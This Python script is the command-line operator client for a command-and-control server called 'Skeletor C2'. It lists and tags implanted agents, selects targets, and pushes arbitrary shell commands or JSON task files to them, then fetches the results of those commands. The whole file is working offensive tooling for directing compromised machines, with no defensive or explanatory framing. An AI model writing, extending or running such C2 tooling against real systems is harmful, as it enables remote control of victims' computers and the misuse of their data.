#!/usr/bin/env python3

import argparse
import requests
import json

SKELETOR_IP = "localhost"
SKELETOR_PORT = "80"


def arg_setup():
    msg = "Command line tool for interaction with Skeletor C2 server"
    parser = argparse.ArgumentParser(description = msg)
    subparsers = parser.add_subparsers(title="Verb", dest="verb", required=True)

    # 'get' command
    get_parser = subparsers.add_parser("get", help="Get resources")
    get_parser.add_argument("resource", help="Resource to retrieve", choices=['agents','targets',"agent","tagged"])
    get_parser.add_argument("arg",nargs="?",help="Agent ID (if resource == 'agent') or Tag Name (if resource == 'tagged')")
    get_parser.set_defaults(verb='get')
    # 'cmd' command
    cmd_parser = subparsers.add_parser("cmd", help="Command agents")
    cmd_parser.add_argument("cmd", help="Command to send to targeted agents")
    cmd_parser.set_defaults(verb='cmd')
    #clear command
    clear_parser = subparsers.add_parser("clear", help="Clear resources")
    clear_parser.add_argument("resource", help="Resource to clear", choices=['targets'])
    #post command
    post_parser = subparsers.add_parser("post", help="Post json file with task to targeted agents")
    post_parser.add_argument("json_file", help="Json file with task to post")
    #set targets
    set_parser = subparsers.add_parser("set", help="Set information")
    set_parser.add_argument("resource", help="Resource to set", choices=['targets'])
    set_parser.add_argument("targets",help="Targets to tag in a comma seperated list (Agent IDs, or tags if tag mode argument is used)")
    set_parser.add_argument("-t","--tag-mode",required=False,help="Use tagging mode",action="store_true")
    #result command
    result_parser = subparsers.add_parser("result", help="Get results")
    result_parser.add_argument("agent_id", help="ID of agent to get results from")
    #tag command
    tag_parser = subparsers.add_parser("tag", help="Tag an agent")
    tag_parser.add_argument("agent_id", help="ID of agent to tag")
    tag_parser.add_argument("tags", help="tag(s) to give agent (if multiple supply as a comma seperated list)")
    
    return parser.parse_args()

def main():
    args = arg_setup()
    
    if args.verb == 'get':
        if args.resource == 'agents':
            agents = requests.get(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-agents").json()
            for agent in agents: 
                print(agent.get('agent_id') + " - " + agent.get('status'))
        elif args.resource == 'targets':
            targets = requests.get(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/targets").text.split("\n")
            for target in targets: 
                print(target)
        elif args.resource == "agent":
            if not args.arg:
                raise SyntaxError("Missing agent_id")
            data = {"agent_id":args.arg}
            agent_info = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-agent",json=data).json()
            print("Agent ID:",args.agent_id)
            print("Status:",agent_info["status"])
            print("Targeted:",agent_info["targeted"])
            print("Callbacks:",agent_info["callbacks"])
            print("Last Seen:",agent_info["last_seen"])
            print("Last Command:",agent_info["last_command"])
            print("Last Result:",agent_info["last_result"])
        elif args.resource == "tagged":
            data = {"tag":args.arg}
            tagged = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/tagged",json=data).json()["agents"]
            print(f"Agents with tag '{args.arg}':")
            for agent in tagged:
                print("\t"+agent)
        else:
            print("Invalid resource type for get command")
    elif args.verb == 'cmd':
        #print("cmd = " + args.cmd)
        for target in requests.get(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/targets").text.split("\n"):
            if target.strip() != "":
                data = {'agent_id': target, 'action': 'command', 'command': args.cmd}
                requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=data)
    elif args.verb == 'clear':
        if args.resource == 'targets':
            requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/clear-targets")
        else:
            print("Invalid resource type for clear command")
    elif args.verb == 'post':
        json_data = json.load(open(args.json_file))
        targets = requests.get(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/targets").text.split("\n")
        for target in targets:
            json_data['agent_id'] = target
            requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=json_data)
    elif args.verb == 'set':
        if args.resource == 'targets':
            if not args.tag_mode:
                ips = args.targets.split(",")
                data = {"ips": ips}
                print(data)
                requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/set-targets", json=data)
            else:
                agents = []
                tags = args.targets.split(",")
                for tag in tags:
                    tag_data = {"tag": tag}
                    resp = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/tagged", json=tag_data).json()
                    if "agents" not in resp:
                        print(f"Error: {resp.get('error', 'unknown error')}")
                    else:
                        agent_ids = resp["agents"]
                        if not agent_ids:
                            print(f"No agents found with tag '{tag}'")
                        else:
                            agents += agent_ids
                data = {"ips": agents}
                print(data)
                requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/set-targets", json=data)
                print(f"Set {len(agents)} agents as targets")
        else:
            print("Invalid resource type for set command")
    elif args.verb in ["result","results"]:
        data = {"agent_id": args.agent_id}
        result = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-result", json=data).json()
        result_str = "\n" + "Agent: " + args.agent_id + "\n" + "Command: " + result.get('command') + "\n" + "Result: " + result.get('result') + "\n"
        print(result_str)
    elif args.verb == "tag":
        data = {"agent_id": args.agent_id,"tags": args.tags}
        print(data)
        resp = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/tag-agent", json=data)
        jason = resp.json()
        print(f"Agent {jason['agent_id']} tagged")
        print(f"Added tags: {', '.join(jason['added_tags']) if jason['added_tags'] else 'None'}")
        print(f"All tags: {', '.join(jason['all_tags'])}")
    else:
        print("Missing agent ID")

if __name__ == '__main__':
    main()